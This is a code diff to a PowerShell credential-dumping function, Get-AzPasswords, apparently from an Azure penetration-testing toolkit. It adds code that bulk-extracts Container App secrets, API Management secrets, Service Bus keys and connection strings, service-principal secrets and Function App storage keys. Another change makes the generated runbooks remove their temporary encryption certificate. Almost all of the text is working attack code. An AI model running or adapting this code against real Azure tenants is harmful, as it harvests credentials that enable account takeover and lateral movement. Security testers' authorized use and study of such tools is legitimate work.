@@ -109,6 +109,21 @@ Function Get-AzPasswords
         [String]$FunctionApps = "Y",
 
         [parameter(Mandatory=$false,
+        HelpMessage="Dump Container App Secrets.")]
+        [ValidateSet("Y","N")]
+        [String]$ContainerApps = "Y",
+
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump API Management Secrets.")]
+        [ValidateSet("Y","N")]
+        [String]$APIManagement = "Y",
+
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump Service Bus Namespace keys.")]
+        [ValidateSet("Y","N")]
+        [String]$ServiceBus = "Y",
+        
+        [parameter(Mandatory=$false,
         HelpMessage="Export the AKS kubeconfigs to local files.")]
         [ValidateSet("Y","N")]
         [String]$ExportKube = "N",
@@ -143,7 +158,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus}
         break
     }
 
@@ -426,7 +441,7 @@ Function Get-AzPasswords
 
                                 $appServiceParameters | ForEach-Object{
                                     # Match the vault parameter and add it to the output
-                                    $TempTblCreds.Rows.Add("AppServiceVaultParameter",$appServiceName+"-Parameter",($_.Name),($configResult.($_.Name)),"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null                                    
+                                    $TempTblCreds.Rows.Add("AppServiceVaultParameter",$appServiceName+" - Parameter",($_.Name),($configResult.($_.Name)),"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null                                    
                                 }
                                 $appServiceParameters = $null
                             }                            
@@ -446,7 +461,20 @@ Function Get-AzPasswords
                         $propName = $resource.properties | gm -M NoteProperty | select name
                         
                         if($resource.Properties.($propName.Name).type -eq 3){
-                            $TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+"-Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
+                            $TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+" - Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
+                        }
+
+                        # Grab Authentication Service Principals
+                        if(($_.SiteConfig.AppSettings | where Name -EQ 'MICROSOFT_PROVIDER_AUTHENTICATION_SECRET').value -ne $null){
+                            $spSecret = ($_.SiteConfig.AppSettings | where Name -EQ 'MICROSOFT_PROVIDER_AUTHENTICATION_SECRET').value
+
+                            # Use APIs to grab Client ID
+                            $mgmtToken = (Get-AzAccessToken -ResourceUrl 'https://management.azure.com/').Token
+                            $subID = (get-azcontext).Subscription.Id
+                            $servicePrincipalID = ((Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$_.ResourceGroup,'/providers/Microsoft.Web/sites/',$_.Name,'/Config/authsettingsV2/list?api-version=2018-11-01')) -UseBasicParsing -Headers @{ Authorization ="Bearer $mgmtToken"} -Verbose:$false ).content | ConvertFrom-Json).properties.identityProviders.azureActiveDirectory.registration.clientId
+
+                            $spClientID = ""
+                            $TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+" - ServicePrincipal",$servicePrincipalID,$spSecret,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
                         }
                     }
                     Write-Verbose "`tProfile available for $appServiceName"
@@ -559,6 +587,9 @@ Function Get-AzPasswords
                     # Encrypt the passwords in the Automation account output
                     "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
 
+                    # Remove the Certificate from the Cert Store
+                    "`Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+
                     # Write the output to the log
                     "write-output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         
@@ -618,7 +649,7 @@ Function Get-AzPasswords
             #Need to fetch via the REST endpoint to check if there's an identity
             $mgmtToken = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
             $accountDetails = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
-            if($accountDetails.identity.type -eq "systemassigned"){
+            if($accountDetails.identity.type -match "systemassigned"){
                 
                 $dumpMI = $true
                 $dumpMiJobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
@@ -635,6 +666,8 @@ Function Get-AzPasswords
                 "`$accessToken = Invoke-RestMethod -Uri `$url -Method 'GET' -Headers `$Headers" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 # Encrypt the token in the Automation account output
                 "`$encryptedOut1 = (`$accessToken.access_token | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                # Remove the encryption cert
+                "Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 
                
@@ -1003,20 +1036,129 @@ Function Get-AzPasswords
                 
                 $functAppName = $_.Name
 
-                Write-Verbose "`tGetting Function keys from the $functAppName application"
+                Write-Verbose "`tGetting Function keys and App Settings from the $functAppName application"
                 # Extract Storage Account Key
-                $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
-                $TempTblCreds.Rows.Add("Function App Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                if($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING -ne $null){
+                    $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
+                    $TempTblCreds.Rows.Add("Function App Content Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                }
+
+                # Extract Job Storage Keys
+                if($_.ApplicationSettings.AzureWebJobsStorage -ne $null){
+                    $appSettings = ($_.ApplicationSettings.AzureWebJobsStorage).Split(";")
+                    $TempTblCreds.Rows.Add("Function App Job Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                }
+
+                # Extract Service Principal
+                if($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET -ne $null){
+                    $appSettings = ($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET)
+
+                    # Use APIs to grab Client ID
+                    $mgmtToken = (Get-AzAccessToken -ResourceUrl 'https://management.azure.com/').Token
+                    $subID = (get-azcontext).Subscription.Id
+                    $servicePrincipalID = ((Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$_.ResourceGroup,'/providers/Microsoft.Web/sites/',$_.Name,'/Config/authsettingsV2/list?api-version=2018-11-01')) -UseBasicParsing -Headers @{ Authorization ="Bearer $mgmtToken"} -Verbose:$false ).content | ConvertFrom-Json).properties.identityProviders.azureActiveDirectory.registration.clientId
+
+                    $TempTblCreds.Rows.Add("Function App Service Principal",$_.Name,$servicePrincipalID,$appSettings,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
+                }
 
                 # Request the Function Keys
-                $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force
-                $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                try{
+                    $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force -ErrorAction Stop
+                    $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                 
-                $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
+                    $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
                 
-                $keyMembers | ForEach-Object{
-                    $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                    $keyMembers | ForEach-Object{
+                        $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                    }
                 }
+                catch{Write-Verbose "`t`tERROR - Getting Function keys from the $functAppName application failed"}
+            }
+        }
+    }
+
+    if ($ContainerApps -eq 'Y'){
+        # Container Apps Section
+
+        # Variable Set Up
+        $CAmanagementToken = (Get-AzAccessToken).Token
+        $subID = (Get-AzContext).Subscription.Id
+
+        # List Resource Groups
+        $RGURL = "https://management.azure.com/subscriptions/$subID/resourceGroups?api-version=2022-01-01"
+        $rgList = ((Invoke-WebRequest -UseBasicParsing -Uri $RGURL -Headers @{ Authorization ="Bearer $CAmanagementToken"} -Method GET -Verbose:$false).Content | ConvertFrom-Json).value
+
+        Write-Verbose "Getting List of Azure Container Apps"
+
+        # Foreach Resource Group, list Container Apps
+        $rgList | ForEach-Object {
+
+            # Get list of Container Apps
+            $CAListURL = "https://management.azure.com/subscriptions/$subID/resourceGroups/$($_.name)/providers/Microsoft.App/containerApps/?api-version=2022-01-01-preview"
+            $CAList = ((Invoke-WebRequest -UseBasicParsing -Uri $CAListURL -Headers @{ Authorization ="Bearer $CAmanagementToken"} -Method GET -Verbose:$false).Content | ConvertFrom-Json).value
+
+            if ($CAList -ne $null){                
+                # For Each Container App, get the secrets
+                $CAList | ForEach-Object{
+                    $CAName = ($_.id).split("/")[-1]
+                    Write-Verbose "`tGetting Container App Secrets from the $CAName application"
+                    $secretsURL = "https://management.azure.com$($_.id)/listSecrets?api-version=2022-01-01-preview"
+                    $CASecrets = ((Invoke-WebRequest -UseBasicParsing -Uri $secretsURL -Headers @{ Authorization ="Bearer $CAmanagementToken"; 'Content-Type' = "application/json"} -Method POST -Verbose:$false).Content | ConvertFrom-Json).value
+
+                    # Add the Secrets to the output table
+                    $CASecrets | ForEach-Object{
+                        $TempTblCreds.Rows.Add("Container App Secret",$CAName,$_.name,$_.value,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
+                    }
+                }
+            }
+        }
+    }
+
+    if ($APIManagement -eq 'Y'){
+        # API Management Section
+
+        Write-Verbose "Getting List of Azure API Management Services"
+        $APIlist = Get-AzApiManagement
+
+        $APIlist | ForEach-Object{
+            $APIMname = $_.Name
+            Write-Verbose "`tGetting API Named Value Secrets from the $APIMname Service"
+            $apimContext = New-AzApiManagementContext -ResourceGroupName $_.ResourceGroupName -ServiceName $_.Name
+            Get-AzApiManagementNamedValue -Context $apimContext | ForEach-Object{
+                if($_.Secret -eq $true){
+                    $secretName = $_.name
+                    try{
+                    # Get the secret value
+                        $APIMsecret = Get-AzApiManagementNamedValueSecretValue -Context $apimContext -NamedValueId $_.NamedValueId -ErrorAction Stop
+                    
+                        Write-Verbose "`t`tGetting $($_.name) Secret"
+
+                        # Add the Secrets to the output table
+                        $TempTblCreds.Rows.Add("API Management Secret",$APIMname,$_.name,$APIMsecret.value,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
+                    }
+                    catch{Write-Verbose "`t`t$secretName Secret is a Key Vault Value, skipping..."}
+                }
+            }
+        }
+    }
+
+    if ($ServiceBus -eq 'Y'){
+    # Service Bus Namespace Section
+    $nameSpaces = Get-AzServiceBusNamespace
+
+    Write-Verbose "Getting List of Azure Service Bus Namespaces"
+
+    $nameSpaces | ForEach-Object{
+        $tempNamespace = $_
+        $authRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $_.ResourceGroupName -Namespace $_.Name
+        $authRule | ForEach-Object{
+            Write-Verbose "`tGetting Keys for the $($_.Name) Authorization Rule"
+
+            $SBkeys = Get-AzServiceBusKey -Namespace $tempNamespace.Name -Name $_.Name -ResourceGroupName $tempNamespace.ResourceGroupName
+            
+            # Add the Secrets to the output table
+            $TempTblCreds.Rows.Add("Service Bus Namespace Key",$tempNamespace.Name,-join($SBkeys.KeyName," - Primary Key"),$SBkeys.PrimaryKey,$SBkeys.PrimaryConnectionString,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+            $TempTblCreds.Rows.Add("Service Bus Namespace Key",$tempNamespace.Name,-join($SBkeys.KeyName," - Secondary Key"),$SBkeys.SecondaryKey,$SBkeys.SecondaryConnectionString,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
             }
         }
     }
